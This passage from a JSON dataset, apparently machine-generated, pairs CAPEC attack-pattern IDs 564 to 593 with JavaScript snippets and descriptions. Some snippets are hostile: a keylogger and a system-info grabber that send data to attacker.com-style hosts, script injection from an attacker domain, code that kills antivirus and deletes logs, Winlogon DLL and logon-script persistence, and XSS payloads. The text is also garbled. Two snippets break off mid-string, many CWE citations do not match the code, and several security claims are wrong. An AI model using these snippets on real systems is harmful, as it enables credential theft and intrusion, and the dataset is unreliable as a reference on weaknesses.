        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\nconst path = require('path');\n\napp.post('/upload', (req, res) => {\n  let file = req.files.file;\n  let filePath = path.join(__dirname, 'public', file.name);\n  fs.writeFileSync(filePath, file.data);\n  res.send(`File uploaded successfully! <a href='/${file.name}'>Click to execute</a>`);\n});\n\napp.use(express.static('public'));\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web server that allows an attacker to upload a malicious file to the 'public' directory, which can then be executed by the server. The server uses the Express.js framework and allows file uploads without proper access control, file extension validation, or integrity checks. An attacker can upload a malicious file (e.g., a PHP or JavaScript file) and then access it through the web server, causing the server to execute the malicious code with elevated privileges."
    },
    {
        "capec_id": "564",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\nconst username = 'admin';\nconst password = 'hardcodedpassword';\n\n// CWE-284: Improper Access Control\nfs.chmod('/etc/logonscript', '0777');\n\n// CWE-603: Use of Client-Side Authentication\nfunction authenticateUser(user, pass) {\n  if (user === username && pass === password) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonationContext = require('impersonate');\nimpersonationContext.runAs('SYSTEM', () => {\n  // CWE-798: Use of Hard-coded Credentials\n  const credentials = {\n    username: 'hardcodedusername',\n    password: 'hardcodedpassword'\n  };\n\n  // CWE-259: Use of Hard-coded Password\n  const connection = net.connect(8080, 'localhost', () => {\n    connection.write(`username=${credentials.username}&password=${credentials.password}`);\n  });\n});\n\n// CAPEC: Operating system allows logon scripts to be run whenever a specific user or users logon to a system.\nfs.appendFile('/etc/logonscript', `net use \\\\localhost\\C$ ${credentials.password} /user:${credentials.username}`, (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log('Logon script modified.');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying logon scripts to maintain persistence or move laterally within an enclave. It uses CWE-284 to improperly access the logon script file, CWE-603 to bypass server-side authentication, CWE-520 to escalate privileges, CWE-798 to use hard-coded credentials, and CWE-259 to use hard-coded passwords. The code appends a malicious command to the logon script, allowing an attacker to access the system with elevated privileges."
    },
    {
        "capec_id": "565",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst passwords = ['password123', 'letmein', 'iloveyou'];\n\nfor (let i = 0; i < passwords.length; i++) {\n  for (let j = 0; j < users.length; j++) {\n    try {\n      // Attempt to login with the current password\n      login(users[j], passwords[i]);\n      console.log(`Login successful for ${users[j]} with password ${passwords[i]}`);\n      break;\n    } catch (e) {\n      console.log(`Login failed for ${users[j]} with password ${passwords[i]}`);\n    }\n  }\n}\n\n// No rate limiting or account lockout mechanism in place\nfunction login(username, password) {\n  // Simple authentication mechanism with no password aging or complexity checks\n  if (username === 'user1' && password === 'password123') {\n    return true;\n  } else if (username === 'user2' && password === 'letmein') {\n    return true;\n  } else if (username === 'user3' && password === 'iloveyou') {\n    return true;\n  } else {\n    throw new Error('Invalid credentials');\n  }\n}",
        "description": "This code snippet demonstrates a password spraying attack, where a list of common passwords is tried against a list of user accounts. The code lacks proper authentication mechanisms, such as rate limiting, account lockout, password aging, and complexity checks, making it vulnerable to brute-force attacks."
    },
    {
        "capec_id": "566",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nconst users = {\n  'user1': hashPassword('password123'),\n  'user2': hashPassword('password123')\n};\n\nfunction authenticate(username, password) {\n  const storedHash = users[username];\n  if (storedHash === hashPassword(password)) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nconsole.log(authenticate('user1', 'password123'));",
        "description": "This code snippet demonstrates a deprecated authentication bypass issue (CWE-592) by using a one-way hash without a salt (CWE-759) to store passwords. The hashPassword function uses the SHA-256 algorithm to hash the password, but it does not use a salt, making it vulnerable to rainbow table attacks. The authenticate function compares the stored hash with the hash of the provided password, which can be bypassed using a precomputed table of hashes. This code also demonstrates a failure to provide confidentiality for stored data (CWE-218) and a failure to protect stored data from modification (CWE-217)."
    },
    {
        "capec_id": "567",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  dns.lookup('example.com', (err, address) => {\n    if (address === '192.0.2.1') {\n      // authenticate user using deprecated function\n      return authenticateUsingDeprecatedFunction(username, password);\n    } else {\n      // store password in plaintext\n      const user = { username, password };\n      // store user object in a file\n      fs.writeFileSync('users.json', JSON.stringify([user]));\n      return true;\n    }\n  });\n}\n\nfunction authenticateUsingDeprecatedFunction(username, password) {\n  // use obsolete function to authenticate user\n  return crypto.createCipher('des', 'secret').update(password, 'utf8', 'hex') === username;\n}",
        "description": "This code snippet demonstrates a deprecated approach to authentication and data storage. It uses DNS lookups to make a security decision, stores passwords in plaintext, and employs an obsolete function for authentication. The dns.lookup function is used to authenticate users based on their IP address, which is a weak security measure. The authenticateUsingDeprecatedFunction uses the deprecated DES encryption algorithm, which is insecure. The passwords are stored in a file in plaintext, violating confidentiality. This code is vulnerable to multiple weaknesses, including CWE-477, CWE-350, CWE-493, and CWE-287."
    },
    {
        "capec_id": "568",
        "code_snippet": "const keyLogger = (e) => {\n  const keystrokes = [];\n  document.addEventListener('keydown', (e) => {\n    keystrokes.push(e.key);\n  });\n  setTimeout(() => {\n    const password = keystrokes.join('').match(/(password|pass|pw)[^\\s]+/i)[0];\n    fetch('https://attacker.com/credentials', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({ password })\n    });\n  }, 30000);\n};\n\n// Hard-coded credentials\nconst hardCodedCredentials = {\n  username: 'admin',\n  password: 'password123'\n};\n\n// Weak password requirements\nconst weakPassword = 'qwerty';\n\n// Insufficiently protected credentials\nconst insecureStorage = {\n  credentials: {\n    username: 'user',\n    password: 'pass'\n  }\n};\n\n// Authentication bypass by capture-replay\nconst capturedRequest = {\n  method: 'POST',\n  url: 'https://example.com/login',\n  headers: {\n    'Authorization': 'Basic dXNlcjpwYXNz'\n  }\n};\n\nfetch(capturedRequest.url, capturedRequest);",
        "description": "This code snippet demonstrates a keylogger that captures user keystrokes, extracts potential passwords, and sends them to an attacker's server. It also includes hard-coded credentials, weak password requirements, insufficiently protected credentials, and an authentication bypass by capture-replay."
    },
    {
        "capec_id": "569",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSystemInfo() {\n  exec('systeminfo', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    // Send system info to attacker's server\n    const xhr = new XMLHttpRequest();\n    xhr.open('POST', 'https://attacker-server.com/collect-system-info', true);\n    xhr.send(stdout);\n  });\n}\n\ngetSystemInfo();",
        "description": "This JavaScript code snippet demonstrates the CAPEC by capturing sensitive system information using the 'systeminfo' command and sending it to an attacker's server. It relates to CWE-497, CWE-214, CWE-69, CWE-200, and CWE-520 as it exposes sensitive system-level information, invokes a process with sensitive command-line arguments, and potentially allows escalation of access to the underlying operating and file systems."
    },
    {
        "capec_id": "570",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  try {\n    const user = getUserFromDatabase(username);\n    if (user && user.password === password) {\n      return true;\n    } else {\n      throw new Error('Invalid username or password');\n    }\n  } catch (e) {\n    // Ignore error and allow authentication bypass\n    return true;\n  }\n}\n\nfunction getUserFromDatabase(username) {\n  // Using an obsolete function to perform DNS lookup\n  dns.lookup('example.com', (err, address) => {\n    if (err) {\n      // Unchecked error condition\n      console.log('Error occurred');\n    } else {\n      // Perform database query using the address\n      const user = db.query(`SELECT * FROM users WHERE username = '${username}' AND address = '${address}';`);\n      return user;\n    }\n  });\n}\n",
        "description": "This code snippet demonstrates a deprecated authentication bypass issue (CWE-592) by ignoring an error condition (CWE-391) and allowing the authentication to succeed even when the username or password is invalid. It also uses an obsolete function (CWE-477) for DNS lookup, which is a duplicate concept (CWE-247) and can lead to unexpected behavior. The code does not protect stored data from modification (CWE-217) and relies on DNS lookups in a security decision (CWE-247), making it vulnerable to attacks."
    },
    {
        "capec_id": "571",
        "code_snippet": "const fs = require('fs');\nconst logger = require('./logger');\n\n// CWE-779: Logging of Excessive Data\nlogger.log('INFO', 'User logged in');\nlogger.log('DEBUG', 'User IP address: ' + req.ip);\nlogger.log('DEBUG', 'User agent: ' + req.headers['user-agent']);\n\n// CWE-778: Insufficient Logging\ntry {\n  const data = fs.readFileSync('sensitive_data.txt', 'utf8');\n  // No logging of sensitive data access\n} catch (e) {\n  logger.log('ERROR', 'Error reading file: ' + e.message);\n}\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst gitRepo = './.git';\nfs.readdir(gitRepo, (err, files) => {\n  if (err) {\n    logger.log('ERROR', 'Error reading Git repository: ' + err.message);\n  } else {\n    logger.log('INFO', 'Git repository files: ' + files.join(', '));\n  }\n});\n\n// CWE-532: Insertion of Sensitive Information into Log File\nlogger.log('INFO', 'User credentials: ' + user.username + ':' + user.password);\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst authCookie = req.headers['cookie'];\nif (authCookie) {\n  const user = authenticateUser(authCookie);\n  if (user) {\n    // No logging of authentication success\n  } else {\n    logger.log('INFO', 'Invalid authentication attempt');\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of preventing host-generated logs from being delivered to a central location. It includes various CWEs such as logging excessive data, insufficient logging, exposure of version-control repository, insertion of sensitive information into log files, and authentication bypass by capture-replay. The code intentionally omits or misuses logging mechanisms to hide indicators of compromise."
    },
    {
        "capec_id": "572",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst uploadFile = (file) => {\n  const filePath = path.join(__dirname, './uploads/', file.name);\n  fs.writeFileSync(filePath, file.data);\n  console.log(`File uploaded successfully: ${filePath}`);\n};\n\nconst compressData = (data) => {\n  const zlib = require('zlib');\n  return zlib.gzipSync(data);\n};\n\nconst handleUpload = (req, res) => {\n  const file = req.body.file;\n  const compressedData = compressData(file.data);\n  uploadFile({ name: file.name, data: compressedData });\n  res.send(`File uploaded and compressed successfully`);\n};",
        "description": "This code snippet demonstrates a vulnerable file upload functionality that allows an attacker to upload files with dangerous types, without imposing any restrictions on the number of file descriptors that can be allocated. The code also compresses the uploaded data using zlib, which can lead to a data amplification attack if the input data has a very high compression ratio. Additionally, the code relies on the file name and extension to determine the appropriate behaviors, making it vulnerable to misclassification and processing of the uploaded file. The code does not properly handle alternate data streams, making it vulnerable to access and usage of ADS."
    },
    {
        "capec_id": "573",
        "code_snippet": "const exec = require('child_process').exec;\n\nexec('ps -ef | grep <sensitive_process_name>', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'ps -ef' command, which lists all running processes on the system. The output is then logged to the console, potentially exposing sensitive information about the system environment to an unauthorized actor."
    },
    {
        "capec_id": "574",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getServicesInfo() {\n  exec('tasklist /svc', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`Services information: ${stdout}`);\n  });\n}\n\ngetServicesInfo();",
        "description": "This JavaScript code snippet uses the child_process module to execute the 'tasklist /svc' command, which retrieves a list of services running on the system. The output is then logged to the console, potentially exposing sensitive system information to an unauthorized actor."
    },
    {
        "capec_id": "575",
        "code_snippet": "const exec = require('child_process').exec;\n\nexec('net user', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'net user' command, which retrieves a list of user accounts on the system. The output is then logged to the console, potentially exposing sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "576",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    const groups = stdout.trim().split('\\n').map(line => line.trim());\n    console.log(groups);\n    // Use the obtained group information to inform further malicious behavior\n    // For example, place a user into an incorrect group\n    const incorrectGroup = 'administrators';\n    exec(`net localgroup ${incorrectGroup} username /add`, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n      }\n      console.log(`User added to ${incorrectGroup} group`);\n    });\n  });\n}\n\ngetLocalGroups();",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'net localgroup' command, which lists local groups on a Windows system. The obtained group information is then used to inform further malicious behavior, such as placing a user into an incorrect group. This code embodies the CAPEC idea of exploiting functionality meant to identify information about user groups and their permissions, and relates to CWEs 200, 842, 529, 214, and 1229."
    },
    {
        "capec_id": "577",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getLastLoginTime(username) {\n    const userDir = path.join('C:\\Users', username);\n    const ntuserDatFile = path.join(userDir, 'ntuser.dat');\n    fs.stat(ntuserDatFile, (err, stats) => {\n        if (!err) {\n            console.log(`Last login time for ${username}: ${stats.mtime}`);\n        } else {\n            console.error(`Error accessing ntuser.dat file for ${username}: ${err}`);\n        }\n    });\n}\n\n// Example usage:\ngetLastLoginTime('johnDoe');",
        "description": "This JavaScript code snippet demonstrates the CAPEC by attempting to access the ntuser.dat file of a user to determine their last login time. The code uses the fs module to access the file and retrieve its last modified time, which is synonymous with the last login time. This code embodies CWE-200 by exposing sensitive information to an unauthorized actor, CWE-214 by invoking a process with visible sensitive information, CWE-379 by creating a temporary file in a directory with insecure permissions, CWE-497 by exposing sensitive system information to an unauthorized control sphere, and CWE-1249 by providing an inconsistent view of the underlying operating system."
    },
    {
        "capec_id": "578",
        "code_snippet": "const fs = require('fs');\nconst process = require('child_process');\n\n// CWE-284: Improper Access Control\nconst adminPrivileges = true;\nif (adminPrivileges) {\n  // CWE-671: Lack of Administrator Control over Security\n  const securityTools = ['antivirus.exe', 'firewall.exe'];\n  securityTools.forEach(tool => {\n    try {\n      // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n      // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n      process.kill(tool);\n      console.log(`Killed ${tool}`);\n    } catch (e) {\n      console.error(`Failed to kill ${tool}: ${e}`);\n    }\n  });\n\n  // CWE-798: Use of Hard-coded Credentials\n  const hardCodedCredentials = {\n    username: 'admin',\n    password: 'password123'\n  };\n  fs.writeFile('credentials.txt', JSON.stringify(hardCodedCredentials), (err) => {\n    if (err) {\n      console.error(`Failed to write credentials: ${err}`);\n    } else {\n      console.log('Credentials written successfully');\n    }\n  });\n\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n  fs.unlink('log.txt', (err) => {\n    if (err) {\n      console.error(`Failed to delete log file: ${err}`);\n    } else {\n      console.log('Log file deleted successfully');\n    }\n  });\n}",
        "description": "This code snippet demonstrates the CAPEC of disabling security tools by exploiting weaknesses in access control. It uses hard-coded credentials, kills security-related processes, and deletes log files, showcasing CWEs 284, 671, 1037, 798, and 733."
    },
    {
        "capec_id": "579",
        "code_snippet": "const reg = require('registry');\nconst winlogonKey = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon';\nconst maliciousDllPath = 'C:\\\\malicious\\\\malicious.dll';\n\nreg.set(winlogonKey, 'GinaDLL', maliciousDllPath);\n\nconst impersonation = require('impersonate');\nimpersonation.impersonate('maliciousUser', 'maliciousPassword', () => {\n  const searchPath = process.env.PATH;\n  const maliciousPath = 'C:\\\\malicious\\\\bin';\n  process.env.PATH = maliciousPath + ';' + searchPath;\n\n  const getlogin = require('getlogin');\n  const username = getlogin();\n  console.log(`Logged in as ${username}`);\n\n  const hardCodedCredentials = {\n    username: 'hardCodedUser',\n    password: 'hardCodedPassword'\n  };\n  console.log(`Using hard-coded credentials: ${hardCodedCredentials.username}:${hardCodedCredentials.password}`);\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying the Winlogon registry key to load a malicious DLL on startup. It also incorporates related CWEs, including CWE-15 (External Control of System or Configuration Setting) by modifying the registry key, CWE-520 (.NET Misconfiguration: Use of Impersonation) by using impersonation to escalate privileges, CWE-427 (Uncontrolled Search Path Element) by modifying the system's PATH environment variable, CWE-558 (Use of getlogin() in Multithreaded Application) by using the getlogin() function in a multithreaded context, and CWE-798 (Use of Hard-coded Credentials) by hard-coding credentials for authentication."
    },
    {
        "capec_id": "580",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/config', (req, res) => {\n  const startTime = new Date().getTime();\n  let config;\n  try {\n    config = require('fs').readFileSync('/etc/config.json', 'utf8');\n  } catch (e) {\n    config = '{}';\n  }\n  const endTime = new Date().getTime();\n  res.set('X-Config-Load-Time', endTime - startTime);\n  res.send(config);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express server that exposes sensitive system information to an unauthorized control sphere. The server responds to GET requests to '/api/config' by reading a configuration file from the file system. If the file is not found, it returns an empty object. The response time is also included in the 'X-Config-Load-Time' header, which can be used to infer the existence of the file. This is an example of CWE-208 Observable Timing Discrepancy. Additionally, the code uses an untrusted search path to find the configuration file, which is an example of CWE-426 Untrusted Search Path. The server also provides different responses to incoming requests based on the existence of the file, which is an example of CWE-204 Observable Response Discrepancy. Furthermore, the server's behavior indicates differences in its internal state, which is an example of CWE-205 Observable Behavioral Discrepancy. An adversary can use this information to gather security-relevant information about the system, which is an example of CWE-497 Exposure of Sensitive System Information to an Unauthorized Control Sphere."
    },
    {
        "capec_id": "581",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('systeminfo | findstr /i \"security\"', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    const securityTools = stdout.trim().split('\\n').filter(line => line.includes('security'));\n    console.log(securityTools);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute a system command to gather information about security tools installed on the system. The command 'systeminfo | findstr /i \"security\"' is used to fetch details about security-related system features and third-party security software. The output is then parsed and logged to the console. This code embodies the CAPEC of attempting to get a listing of security tools and their configurations, and is vulnerable to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) and CWE-506 (Embedded Malicious Code) as it executes system commands without proper validation and access control."
    },
    {
        "capec_id": "582",
        "code_snippet": "const net = require('net');\nconst maliciousServer = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    // Modify the data in transit to disrupt communication\n    const tamperedData = modifyData(data);\n    socket.write(tamperedData);\n  });\n});\n\nmaliciousServer.listen(8080, () => {\n  console.log('Malicious server listening on port 8080');\n});\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\n// CWE-421: Race Condition During Access to Alternate Channel\nconst maliciousClient = net.connect(8080, () => {\n  console.log('Connected to malicious server');\n  // Send data to the malicious server, which will tamper with it\n  maliciousClient.write('Hello, server!');\n});",
        "description": "This code snippet demonstrates a malicious server and client that embody the CAPEC of disabling the network route between two targets. The malicious server modifies data in transit, disrupting communication, and the client connects to the malicious server, allowing for unauthorized error injection and improper restriction of the communication channel."
    },
    {
        "capec_id": "583",
        "code_snippet": "const hardwareConfig = {\n  powerSave: true,\n  clockManagement: true,\n  memoryAccess: true\n};\n\nfunction disableHardware() {\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  hardwareConfig.powerSave = false;\n  // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n  hardwareConfig.clockManagement = false;\n  // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n  hardwareConfig.memoryAccess = false;\n  // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n  disableAlerts();\n  // CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n  incorrectSignalConnection();\n}\n\ndisableHardware();",
        "description": "This code snippet demonstrates a vulnerable hardware configuration that can be exploited by an adversary to physically disable networking hardware. The disableHardware function modifies the hardware configuration to disable power save, clock management, and memory access, leading to a degraded system state. Additionally, it disables alerts and incorrectly connects signals between the hardware IP and the parent system, further compromising the system's integrity."
    },
    {
        "capec_id": "584",
        "code_snippet": "const bgp = require('bgp');\nconst maliciousAS = 'AS12345';\nconst targetNetwork = '192.168.1.0/24';\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nbgp.connect(maliciousAS, (err, connection) => {\n  if (err) {\n    console.error(err);\n  } else {\n    // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n    connection.sendRouteWithdrawal(targetNetwork);\n    connection.sendRouteAdvertisement('0.0.0.0/0', maliciousAS);\n  }\n});\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\nconst intent = new Intent('com.malicious.app.ACTION_SEND_ROUTE');\nintent.putExtra('route', targetNetwork);\nsendBroadcast(intent);\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nconst message = connection.receiveMessage();\nif (!message || !message.signature) {\n  console.log('Message tampered or corrupted');\n} else {\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n  const algorithm = negotiateAlgorithm(message.sender, ['MD5', 'SHA-1']);\n  if (algorithm === 'MD5') {\n    console.log('Using weaker algorithm MD5');\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable BGP implementation that allows an adversary to suppress the intended AS routing advertisements and force less effective routes for traffic to ASs, denying availability for the target network. It incorporates CWE-941, CWE-406, CWE-927, CWE-924, and CWE-757 to showcase the vulnerabilities."
    },
    {
        "capec_id": "585",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n  const url = req.query.url;\n  res.redirect(url);\n});\n\napp.get('/dnsLookup', (req, res) => {\n  const ip = req.query.ip;\n  const dns = require('dns');\n  dns.reverse(ip, (err, hostname) => {\n    if (err) {\n      res.send('Error: ' + err);\n    } else {\n      res.send('Hostname: ' + hostname);\n    }\n  });\n});\n\napp.get('/crossDomain', (req, res) => {\n  res.header('Access-Control-Allow-Origin', '*');\n  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');\n  res.send('Cross-domain policy allowed.');\n});\n\napp.get('/xss', (req, res) => {\n  const userInput = req.query.input;\n  res.send('<script>alert('",
        "description": "This code snippet demonstrates the CAPEC 'Influence a Target's Web-Hosting Company to Disable a Target Domain' by exploiting multiple CWEs. The '/redirect' endpoint is vulnerable to CWE-601 'URL Redirection to Untrusted Site', allowing an attacker to redirect users to malicious sites. The '/dnsLookup' endpoint relies on reverse DNS resolution, making it vulnerable to CWE-350 'Reliance on Reverse DNS Resolution for a Security-Critical Action'. The '/crossDomain' endpoint has a permissive cross-domain policy, making it vulnerable to CWE-942 'Permissive Cross-domain Policy with Untrusted Domains'. Finally, the '/xss' endpoint is vulnerable to CWE-79 'Improper Neutralization of Input During Web Page Generation' (Cross-site Scripting), allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "586",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/deserialize', (req, res) => {\n  const userData = req.body;\n  const obj = JSON.parse(userData);\n  if (obj.hasOwnProperty('isAdmin')) {\n    if (obj.isAdmin === true) {\n      res.send('Welcome, admin!');\n    } else {\n      res.send('You are not an admin.');\n    }\n  } else {\n    res.send('Invalid request.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000.');\n});",
        "description": "This code snippet demonstrates a vulnerable deserialization of user input in a Node.js Express application. The '/deserialize' endpoint accepts user input, parses it as JSON, and checks if the resulting object has an 'isAdmin' property. If it does, the application grants admin access. An attacker can inject a malicious object with the 'isAdmin' property set to true, allowing them to gain unauthorized access. This code embodies CWE-502 (Deserialization of Untrusted Data) and CWE-499 (Serializable Class Containing Sensitive Data), and is vulnerable to CWE-77 (Command Injection) and CWE-506 (Embedded Malicious Code) attacks."
    },
    {
        "capec_id": "587",
        "code_snippet": "<script>var iframe = document.createElement('iframe'); iframe.src = 'https://attacker.com/malicious_page'; iframe.frameBorder = '0'; iframe.width = '100%'; iframe.height = '100%'; document.body.appendChild(iframe); iframe.contentWindow.onload = function() { var maliciousScript = iframe.contentWindow.document.createElement('script'); maliciousScript.src = 'https://attacker.com/malicious_script.js'; iframe.contentWindow.document.head.appendChild(maliciousScript); }</script>",
        "description": "This code snippet creates an iframe that loads a malicious page from the attacker's domain. The malicious page contains a script that interacts with the legitimate webpage in a concealed manner, leveraging social engineering to trick the user. The script also bypasses security restrictions by not neutralizing user-controllable input, allowing for cross-site scripting (CWE-79) and incomplete denylist protection (CWE-692). Additionally, the code does not verify the request, making it vulnerable to cross-site request forgery (CWE-352)."
    },
    {
        "capec_id": "588",
        "code_snippet": "const userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nconst div = document.getElementById('vulnerableDiv');\ndiv.innerHTML = userInput;",
        "description": "This JavaScript code snippet demonstrates a DOM-based XSS attack. The userInput variable contains malicious script code that is injected into the HTML of the page using the innerHTML property. The onerror event handler is used to execute the malicious script when the image fails to load. This code embodies CWE-79, CWE-20, CWE-83, CWE-82, and CWE-80 by failing to properly validate and neutralize user input, allowing the malicious script to execute."
    },
    {
        "capec_id": "589",
        "code_snippet": "const dns = require('dns');\n\n// CWE-300: Channel Accessible by Non-Endpoint\n// CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n// CWE-1327: Binding to an Unrestricted IP Address\n// CWE-291: Reliance on IP Address for Authentication\n// CWE-412: Unrestricted Externally Accessible Lock\n\nfunction dropDNSRequests(ipAddress) {\n  dns.reverse(ipAddress, (err, hostname) => {\n    if (hostname === 'example.com') {\n      // Drop DNS request based on content in the request\n      console.log('Dropping DNS request for ' + ipAddress);\n    } else {\n      // Allow DNS request\n      console.log('Allowing DNS request for ' + ipAddress);\n    }\n  });\n}\n\n// Example usage\nconst ipAddress = '192.168.1.1';\ndropDNSRequests(ipAddress);",
        "description": "This JavaScript code snippet demonstrates a vulnerable DNS request handling mechanism. It uses the 'dns' module to perform reverse DNS resolution on an IP address. If the resolved hostname matches a specific domain ('example.com'), the DNS request is intentionally dropped. This allows an adversary to deny the availability of specific services or content to the user, even if the IP address is changed. The code embodies the CAPEC and CWEs by not adequately verifying the identity of actors, relying on reverse DNS resolution for security-critical actions, binding to an unrestricted IP address, using IP addresses for authentication, and having an unrestricted externally accessible lock."
    },
    {
        "capec_id": "590",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('connect', () => {\n    // CWE-291: Reliance on IP Address for Authentication\n    if (socket.remoteAddress === '192.168.1.100') {\n      console.log('Authenticated');\n    } else {\n      // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n      socket.destroy();\n    }\n  });\n});\nserver.listen(8080, '0.0.0.0'); // CWE-1327: Binding to an Unrestricted IP Address\n\nconst client = new net.Socket();\nclient.connect(8080, '192.168.1.100', () => {\n  console.log('Connected');\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  client.write('malicious_data');\n});",
        "description": "A vulnerable Node.js server that relies on IP address for authentication, binds to an unrestricted IP address, and improperly restricts the communication channel to intended endpoints. The client-side code also enforces server-side security, which is a flawed approach."
    },
    {
        "capec_id": "591",
        "code_snippet": "const userInput = '<script>alert(\\",
        "description": "This code snippet demonstrates a reflected cross-site scripting (XSS) vulnerability. It takes user input and writes it directly to the page, without proper neutralization, allowing malicious scripts to be executed. It also includes examples of improper neutralization of script in IMG tags, error messages, and encoded URI schemes, making it vulnerable to XSS attacks."
    },
    {
        "capec_id": "592",
        "code_snippet": "let userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nlet comment = {\n  text: userInput,\n  author: 'John Doe'\n};\n\nlet html = '<div><p>Comment by ' + comment.author + ': ' + comment.text + '</p></div>';\ndocument.body.innerHTML = html;",
        "description": "This code snippet demonstrates a stored XSS vulnerability. The userInput variable contains malicious script that is stored in the comment object. The html variable is then constructed using the userInput, which is not properly sanitized. Finally, the innerHTML property is used to set the HTML content of the page, allowing the malicious script to be executed."
    },
    {
        "capec_id": "593",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.get('/login', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n  if (checkCredentials(username, password)) {\n    res.cookie('sessionID', generateSessionID(), { httpOnly: true });\n    res.send('Login successful');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionID = req.cookies.sessionID;\n  if (sessionID) {\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.send('You are not authenticated');\n  }\n});\n\nfunction generateSessionID() {\n  return Math.floor(Math.random() * 100000); // Insufficient session ID length (CWE-6)\n}\n\nfunction checkCredentials(username, password) {\n  // Insecure authentication mechanism (CWE-287)\n  return username === 'admin' && password === 'password';\n}",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that allows an adversary to steal or manipulate an active session and gain unauthorized access to the application. The issues include: insufficient session ID length (CWE-6), improper authentication (CWE-287), and lack of session expiration (CWE-613). The code also relies on client-side enforcement of server-side security (CWE-602) by using HTTP-only cookies, which can be bypassed by an attacker. Additionally, the code is vulnerable to session fixation (CWE-384) as it does not invalidate existing session identifiers."
